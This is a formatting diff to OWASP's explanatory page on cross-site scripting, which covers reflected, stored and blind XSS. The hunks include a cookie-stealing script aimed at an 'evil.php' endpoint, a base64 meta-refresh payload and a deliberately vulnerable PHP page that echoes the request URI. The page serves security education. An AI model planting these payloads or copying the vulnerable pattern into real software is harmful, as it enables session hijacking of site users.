@@ -1,12 +1,10 @@
 ---
-
 layout: col-sidebar
 title: Cross Site Scripting (XSS)
 author: KirstenS
 contributors: Jim Manico, Jeff Williams, Dave Wichers, Adar Weidman, Roman, Alan Jex, Andrew Smith, Jeff Knutson, Imifos, Erez Yalon, kingthorin, Vikas Khanna. Grant Ongers
 permalink: /attacks/xss/
 tags: attack, XSS
-
 ---
 
 {% include writers.html %}
@@ -70,7 +68,7 @@ under the guise of the vulnerable site.
 
 ### Reflected and Stored XSS Attacks
 
-XSS attacks can generally be categorized into two categories: reflected 
+XSS attacks can generally be categorized into two categories: reflected
 and stored. There is a third, much less well-known type of XSS attack
 called [DOM Based XSS](../DOM_Based_XSS) that is discussed
 separately [here](../DOM_Based_XSS).
@@ -87,7 +85,7 @@ specially crafted form, or even just browsing to a malicious site, the
 injected code travels to the vulnerable web site, which reflects the
 attack back to the user’s browser. The browser then executes the code
 because it came from a "trusted" server. Reflected XSS is also sometimes
-referred to as Non-Persistent or Type-I XSS (the attack is carried out 
+referred to as Non-Persistent or Type-I XSS (the attack is carried out
 through a single request / response cycle).
 
 #### Stored XSS Attacks
@@ -98,9 +96,9 @@ visitor log, comment field, etc. The victim then retrieves the malicious
 script from the server when it requests the stored information. Stored
 XSS is also sometimes referred to as Persistent or Type-II XSS.
 
-#### Blind Cross-site Scripting 
+#### Blind Cross-site Scripting
 
-Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attacker's payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attacker's submitted form via the backend application, the attacker’s payload will get executed. 
+Blind Cross-site Scripting is a form of persistent XSS. It generally occurs when the attacker's payload saved on the server and reflected back to the victim from the backend application. For example in feedback forms, an attacker can submit the malicious payload using the form, and once the backend user/admin of the application will open the attacker's submitted form via the backend application, the attacker’s payload will get executed.
 Blind Cross-site Scripting is hard to confirm in the real-world scenario but one of the best tools for this is XSS Hunter.
 
 ### Other Types of XSS Vulnerabilities
@@ -201,8 +199,10 @@ get rid of `alert()` totally. More information about this method can be
 found in RFC 2397
 
 ```html
-<META HTTP-EQUIV="refresh"
-CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg">
+<meta
+  http-equiv="refresh"
+  content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg"
+/>
 ```
 
 These and others examples can be found at the OWASP [XSS Filter Evasion Cheat Sheet](../../xss-filter-evasion-cheatsheet) which is a true
@@ -280,36 +280,36 @@ includes unvalidated data in an HTTP response. There are three vectors
 by which an XSS attack can reach a victim:
 
 - As in Example 1, data is read directly from the HTTP request and
-    reflected back in the HTTP response. Reflected XSS exploits occur
-    when an attacker causes a user to supply dangerous content to a
-    vulnerable web application, which is then reflected back to the user
-    and executed by the web browser. The most common mechanism for
-    delivering malicious content is to include it as a parameter in a
-    URL that is posted publicly or e-mailed directly to victims. URLs
-    constructed in this manner constitute the core of many phishing
-    schemes, whereby an attacker convinces victims to visit a URL that
-    refers to a vulnerable site. After the site reflects the attacker's
-    content back to the user, the content is executed and proceeds to
-    transfer private information, such as cookies that may include
-    session information, from the user's machine to the attacker or
-    perform other nefarious activities.
+  reflected back in the HTTP response. Reflected XSS exploits occur
+  when an attacker causes a user to supply dangerous content to a
+  vulnerable web application, which is then reflected back to the user
+  and executed by the web browser. The most common mechanism for
+  delivering malicious content is to include it as a parameter in a
+  URL that is posted publicly or e-mailed directly to victims. URLs
+  constructed in this manner constitute the core of many phishing
+  schemes, whereby an attacker convinces victims to visit a URL that
+  refers to a vulnerable site. After the site reflects the attacker's
+  content back to the user, the content is executed and proceeds to
+  transfer private information, such as cookies that may include
+  session information, from the user's machine to the attacker or
+  perform other nefarious activities.
 - As in Example 2, the application stores dangerous data in a database
-    or other trusted data store. The dangerous data is subsequently read
-    back into the application and included in dynamic content. Stored
-    XSS exploits occur when an attacker injects dangerous content into a
-    data store that is later read and included in dynamic content. From
-    an attacker's perspective, the optimal place to inject malicious
-    content is in an area that is displayed to either many users or
-    particularly interesting users. Interesting users typically have
-    elevated privileges in the application or interact with sensitive
-    data that is valuable to the attacker. If one of these users
-    executes malicious content, the attacker may be able to perform
-    privileged operations on behalf of the user or gain access to
-    sensitive data belonging to the user.
+  or other trusted data store. The dangerous data is subsequently read
+  back into the application and included in dynamic content. Stored
+  XSS exploits occur when an attacker injects dangerous content into a
+  data store that is later read and included in dynamic content. From
+  an attacker's perspective, the optimal place to inject malicious
+  content is in an area that is displayed to either many users or
+  particularly interesting users. Interesting users typically have
+  elevated privileges in the application or interact with sensitive
+  data that is valuable to the attacker. If one of these users
+  executes malicious content, the attacker may be able to perform
+  privileged operations on behalf of the user or gain access to
+  sensitive data belonging to the user.
 - A source outside the application stores dangerous data in a database
-    or other data store, and the dangerous data is subsequently read
-    back into the application as trusted data and included in dynamic
-    content.
+  or other data store, and the dangerous data is subsequently read
+  back into the application as trusted data and included in dynamic
+  content.
 
 ### Attack Examples
 
@@ -321,9 +321,9 @@ to do is to place the following code in any posted input(ie: message
 boards, private messages, user profiles):
 
 ```html
-<SCRIPT type="text/javascript">
-var adr = '../evil.php?cakemonster=' + escape(document.cookie);
-</SCRIPT>
+<script type="text/javascript">
+  var adr = "../evil.php?cakemonster=" + escape(document.cookie);
+</script>
 ```
 
 The above code will pass an escaped content of the cookie (according to
@@ -340,12 +340,11 @@ below as an example to inform user about what specific page is missing:
 
 ```html
 <html>
-<body>
-<?php
+  <body>
+    <?php
 print "Not found: " . urldecode($_SERVER["REQUEST_URI"]);
 ?>
-
-</body>
+  </body>
 </html>
 ```
 
@@ -363,7 +362,7 @@ cookie.
 
 - [XSS Attacks](https://owasp.org/www-community/attacks/xss/)
 - [Invoking untrusted mobile code](https://owasp.org/www-community/attacks/Mobile_code_invoking_untrusted_mobile_code)
-- [Cross Site History Manipulation (XSHM)](https://owasp.org/www-community/attacks/Cross_Site_History_Manipulation_(XSHM))
+- [Cross Site History Manipulation (XSHM)](<https://owasp.org/www-community/attacks/Cross_Site_History_Manipulation_(XSHM)>)
 
 ## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)
 
